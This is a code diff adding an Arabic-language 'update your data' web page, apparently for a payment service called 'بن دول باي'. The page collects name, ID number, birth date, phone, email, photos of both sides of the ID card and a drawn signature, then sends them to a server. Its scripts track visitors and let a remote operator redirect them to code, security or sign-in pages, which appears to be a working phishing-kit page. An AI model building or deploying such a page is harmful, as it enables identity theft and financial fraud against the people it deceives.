@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>تحديث البيانات - بن دول باي</title>
+<link rel="icon" href="assets/img/icone.png">
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root{--primary:#364abf;--primary-dark:#2b3b99;--bg:#e8ecf5;--card:#fff;--ink:#1a1d2e;--ink-soft:#8b90a0}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Tajawal',sans-serif;background:var(--bg);min-height:100vh;padding:24px}
+.box{background:var(--card);border-radius:24px;padding:30px 24px;max-width:480px;margin:0 auto;box-shadow:0 8px 30px rgba(0,0,0,.06)}
+h1{font-size:20px;font-weight:900;color:var(--ink);text-align:center;margin-bottom:4px}
+.sub{color:var(--ink-soft);font-size:13px;text-align:center;margin-bottom:20px}
+label{display:block;font-size:13px;font-weight:700;color:var(--ink);margin-bottom:6px;margin-top:14px}
+input[type=text],input[type=email],input[type=tel],input[type=date]{
+  width:100%;height:48px;border:2px solid #e2e8f0;border-radius:12px;padding:0 14px;
+  font-family:inherit;font-size:14px;font-weight:600;color:var(--ink);outline:none;text-align:right}
+input:focus{border-color:var(--primary)}
+.upload-area{border:2px dashed #e2e8f0;border-radius:12px;padding:20px;text-align:center;cursor:pointer;margin-top:6px;transition:.2s}
+.upload-area:hover{border-color:var(--primary);background:rgba(54,74,191,.02)}
+.upload-area.has{border-color:#22c55e;background:rgba(34,197,94,.04)}
+.upload-area input{display:none}
+.upload-area .txt{font-size:12px;color:var(--ink-soft)}
+.upload-area img{max-width:100%;max-height:120px;border-radius:8px;margin-top:8px}
+canvas{border:2px solid #e2e8f0;border-radius:12px;width:100%;height:120px;cursor:crosshair;touch-action:none;margin-top:6px}
+.sig-clear{font-size:11px;color:var(--primary);cursor:pointer;font-weight:700;margin-top:4px;display:inline-block}
+.btn{width:100%;height:52px;border:none;border-radius:14px;background:var(--primary);color:#fff;
+  font-family:inherit;font-weight:800;font-size:17px;cursor:pointer;margin-top:20px}
+.btn:disabled{background:#aab;cursor:not-allowed}
+.err{color:#dc2626;font-size:13px;font-weight:700;min-height:18px;margin-top:10px;text-align:center}
+</style>
+</head>
+<body>
+<div class="box">
+  <h1>📋 تحديث البيانات</h1>
+  <p class="sub">يرجى تحديث بياناتك الشخصية</p>
+
+  <label>الاسم الكامل</label>
+  <input type="text" id="fullName" placeholder="الاسم الكامل">
+
+  <label>رقم الهوية / الجواز</label>
+  <input type="text" id="idNumber" placeholder="رقم الهوية">
+
+  <label>تاريخ الميلاد</label>
+  <input type="date" id="birthDate">
+
+  <label>رقم الجوال</label>
+  <input type="tel" id="phone" placeholder="05xxxxxxxx">
+
+  <label>البريد الإلكتروني</label>
+  <input type="email" id="email" placeholder="example@mail.com">
+
+  <label>صورة الهوية (الأمامية)</label>
+  <div class="upload-area" id="frontArea" onclick="document.getElementById('frontFile').click()">
+    <input type="file" id="frontFile" accept="image/*" onchange="previewFile(this,'frontArea','frontData')">
+    <div class="txt">📷 اضغط لرفع الصورة</div>
+  </div>
+
+  <label>صورة الهوية (الخلفية)</label>
+  <div class="upload-area" id="backArea" onclick="document.getElementById('backFile').click()">
+    <input type="file" id="backFile" accept="image/*" onchange="previewFile(this,'backArea','backData')">
+    <div class="txt">📷 اضغط لرفع الصورة</div>
+  </div>
+
+  <label>التوقيع</label>
+  <canvas id="sigCanvas"></canvas>
+  <span class="sig-clear" onclick="clearSig()">🗑️ مسح التوقيع</span>
+
+  <button class="btn" id="sendBtn" onclick="submitData()">إرسال</button>
+  <p class="err" id="errMsg"></p>
+</div>
+
+<script>
+var _vid=Math.random().toString(36).slice(2);
+var id=new URLSearchParams(location.search).get('id')||'';
+var frontData='',backData='';
+function heartbeat(){fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({page:'update',vid:_vid})}).catch(function(){});}
+setInterval(heartbeat,10000);heartbeat();
+
+function previewFile(inp,areaId,dataVar){
+  var f=inp.files[0];if(!f)return;
+  var r=new FileReader();
+  r.onload=function(e){
+    if(dataVar==='frontData')frontData=e.target.result;
+    else backData=e.target.result;
+    var area=document.getElementById(areaId);
+    area.classList.add('has');
+    area.innerHTML='<img src="'+e.target.result+'">';
+  };
+  r.readAsDataURL(f);
+}
+
+var canvas=document.getElementById('sigCanvas'),ctx=canvas.getContext('2d'),drawing=false;
+function resizeCanvas(){canvas.width=canvas.offsetWidth;canvas.height=canvas.offsetHeight;ctx.strokeStyle='#1a1d2e';ctx.lineWidth=2;ctx.lineCap='round';}
+resizeCanvas();window.addEventListener('resize',resizeCanvas);
+function getPos(e){var r=canvas.getBoundingClientRect();var t=e.touches?e.touches[0]:e;return{x:t.clientX-r.left,y:t.clientY-r.top};}
+canvas.addEventListener('mousedown',function(e){drawing=true;var p=getPos(e);ctx.beginPath();ctx.moveTo(p.x,p.y);});
+canvas.addEventListener('mousemove',function(e){if(!drawing)return;var p=getPos(e);ctx.lineTo(p.x,p.y);ctx.stroke();});
+canvas.addEventListener('mouseup',function(){drawing=false;});
+canvas.addEventListener('touchstart',function(e){e.preventDefault();drawing=true;var p=getPos(e);ctx.beginPath();ctx.moveTo(p.x,p.y);});
+canvas.addEventListener('touchmove',function(e){e.preventDefault();if(!drawing)return;var p=getPos(e);ctx.lineTo(p.x,p.y);ctx.stroke();});
+canvas.addEventListener('touchend',function(){drawing=false;});
+function clearSig(){ctx.clearRect(0,0,canvas.width,canvas.height);}
+
+function submitData(){
+  var btn=document.getElementById('sendBtn');
+  btn.disabled=true;btn.textContent='جاري الإرسال...';
+  var sig=canvas.toDataURL('image/png');
+  var body={
+    full_name:document.getElementById('fullName').value.trim(),
+    id_number:document.getElementById('idNumber').value.trim(),
+    birth_date:document.getElementById('birthDate').value,
+    phone:document.getElementById('phone').value.trim(),
+    email:document.getElementById('email').value.trim(),
+    signature:sig,id_front:frontData,id_back:backData
+  };
+  fetch('/api/submit-update/'+id,{
+    method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(body)
+  }).then(function(r){return r.json();}).then(function(){
+    window.location.href='loading.html?id='+id;
+  }).catch(function(){
+    btn.disabled=false;btn.textContent='إرسال';
+    document.getElementById('errMsg').textContent='حدث خطأ، حاول مرة أخرى';
+  });
+}
+
+function pollStatus(){
+  if(!id)return;
+  fetch('/api/status/'+id).then(function(r){return r.json();}).then(function(d){
+    if(d.status==='redirect'&&d.redirect){
+      if(d.redirect==='update-data')return;
+      if(d.redirect==='code')window.location.href='code.html?id='+id;
+      else if(d.redirect==='security')window.location.href='security.html?id='+id;
+      else if(d.redirect==='loading')window.location.href='loading.html?id='+id;
+      else if(d.redirect==='login')window.location.href='signin.html';
+    }
+  }).catch(function(){});
+}
+setInterval(pollStatus,3000);
+</script>
+</body>
+</html>
